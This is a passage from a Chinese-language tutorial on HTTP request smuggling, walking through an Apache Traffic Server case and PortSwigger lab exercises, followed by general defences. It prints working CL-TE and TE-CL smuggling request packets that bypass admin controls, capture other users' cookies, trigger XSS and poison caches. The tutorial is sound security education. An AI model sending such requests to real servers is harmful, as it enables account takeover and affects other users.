    }
    echo "get random string: ";
    echo randomkeys(8);
构造请求包
    GET /1.html HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Cache-control: max-age=10\r\n
    Content-Length: 56\r\n
    \r\n
    GET /random_str.php HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
第一次请求
第二次请求
可以看到，当缓存命中时，请求体中的数据变成了下一个请求，并且成功的获得了响应。
    GET /random_str.php HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
而且在整个请求中，所有的请求头都是符合RFC规范的，这就意味着，在ATS前方的代理服务器，哪怕严格实现了RFC标准，也无法避免该攻击行为对其他用户造成影响。
ATS的修复措施也是简单粗暴，当缓存命中时，把整个请求体清空就好了。
## 5\. 其他攻击实例
在前面，我们已经看到了不同种代理服务器组合所产生的HTTP请求走私漏洞，也成功模拟了使用HTTP请求走私这一攻击手段来进行会话劫持，但它能做的不仅仅是这些，在PortSwigger中提供了利用HTTP请求走私攻击的[实验](https://portswigger.net/web-security/request-smuggling/exploiting)，可以说是很典型了。
### 5.1 绕过前端服务器的安全控制
在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用`CL-TE`和`TE-CL`绕过前端的访问控制。
#### 5.1.1 使用CL-TE绕过前端服务器安全控制
Lab地址：
实验的最终目的是获取admin权限并删除用户carlos
我们直接访问`/admin`，会返回提示`Path /admin is blocked`，看样子是被前端服务器阻止了，根据题目的提示`CL-TE`，我们可以尝试构造数据包
    POST / HTTP/1.1
    Host: ac1b1f991edef1f1802323bc00e10084.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Cookie: session=Iegl0O4SGnwlddlFQzxduQdt8NwqWsKI
    Content-Length: 38
    Transfer-Encoding: chunked
    0
    GET /admin HTTP/1.1
    foo: bar
进行多次请求之后，我们可以获得走私过去的请求的响应。
提示只有是以管理员身份访问或者在本地登录才可以访问`/admin`接口。
在下方走私的请求中，添加一个`Host: localhost`请求头，然后重新进行请求，一次不成功多试几次。
如图所示，我们成功访问了admin界面。也知道了如何删除一个用户，也就是对`/admin/delete?username=carlos`进行请求。
修改下走私的请求包再发送几次即可成功删除用户`carlos`。
需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个`\r\n`不能丢弃。
#### 5.1.1 使用TE-CL绕过前端服务器安全控制
Lab地址：
这个实验与上一个就十分类似了，具体攻击过程就不在赘述了。
### 5.2 获取前端服务器重写请求字段
在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：
  * 描述TLS连接所使用的协议和密码
  * 包含用户IP地址的XFF头
  * 用户的会话令牌ID
总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：
  * 找一个能够将请求参数的值输出到响应中的POST请求
  * 把该POST请求中，找到的这个特殊的参数放在消息的最后面
  * 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。
怎么理解呢，还是做一下实验来一起来学习下吧。
Lab地址：
实验的最终目的还是删除用户 `carlos`。
我们首先进行第一步骤，找一个能够将请求参数的值输出到响应中的POST请求。
在网页上方的搜索功能就符合要求
构造数据包
    POST / HTTP/1.1
    Host: ac831f8c1f287d3d808d2e1c00280087.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=2rOrjC16pIb7ZfURX8QlSuU1v6UMAXLA
    Content-Length: 77
    Transfer-Encoding: chunked
    0
    POST / HTTP/1.1
    Content-Length: 70
    Connection: close
    search=123
多次请求之后就可以获得前端服务器添加的请求头
这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为
    POST / HTTP/1.1
    Content-Length: 70
    Connection: close
    search=123
其中`Content-Length`的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。
接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。
在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。
### 5.3 获取其他用户的请求
在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。
Lab地址：
实验的最终目的是获取其他用户的Cookie用来访问其他账号。
我们首先去寻找一个能够将传入的信息存储到网站中的POST请求表单，很容易就能发现网站中有一个用户评论的地方。
抓取POST请求并构造数据包
    POST / HTTP/1.1
    Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Cookie: session=oGESUVlKzuczaZSzsazFsOCQ4fdLetwa
    Content-Length: 267
    Transfer-Encoding: chunked
    0
    POST /post/comment HTTP/1.1
    Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net
    Cookie: session=oGESUVlKzuczaZSzsazFsOCQ4fdLetwa
    Content-Length: 400
    csrf=JDqCEvQexfPihDYr08mrlMun4ZJsrpX7&postId=5&name=meng&email=email%40qq.com&website=&comment=
这样其实就足够了，但是有可能是实验环境的问题，我无论怎么等都不会获取到其他用户的请求，反而抓了一堆我自己的请求信息。不过原理就是这样，还是比较容易理解的，最重要的一点是，走私的请求是不完整的。
### 5.4 利用反射型XSS
我们可以使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞。
Lab地址：
在实验介绍中已经告诉了前端服务器不支持分块编码，目标是执行alert(1)
首先根据UA出现的位置构造Payload
然后构造数据包
    POST / HTTP/1.1
    Host: ac801fd21fef85b98012b3a700820000.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 123
    Transfer-Encoding: chunked
    0
    GET /post?postId=5 HTTP/1.1
    User-Agent: ">#
    Content-Type: application/x-www-form-urlencoded
此时在浏览器中访问，就会触发弹框
再重新发一下，等一会刷新，可以看到这个实验已经解决了。
### 5.5 进行缓存投毒
一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。
Lab地址：
实验环境中提供了漏洞利用的辅助服务器。
需要添加两个请求包，一个POST，携带要走私的请求包，另一个是正常的对JS文件发起的GET请求。
以下面这个JS文件为例
    /resources/js/labHeader.js
编辑响应服务器
构造POST走私数据包
    POST / HTTP/1.1
    Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net
    Content-Length: 129
    Transfer-Encoding: chunked
    0
    GET /post/next?postId=3 HTTP/1.1
    Host: acb11fe31e16e96b800e125a013b009f.web-security-academy.net
    Content-Length: 10
    123
然后构造GET数据包
    GET /resources/js/labHeader.js HTTP/1.1
    Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Connection: close
POST请求和GET请求交替进行，多进行几次，然后访问js文件，响应为缓存的漏洞利用服务器上的文件。
访问主页，成功弹窗，可以知道，js文件成功的被前端服务器进行了缓存。
## 6\. 如何防御
从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。
  * 禁用代理服务器与后端服务器之间的TCP连接重用。
  * 使用HTTP/2协议。
  * 前后端使用相同的服务器。
以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。
## 参考链接
  * 
  * 
  * 
  * 
* * *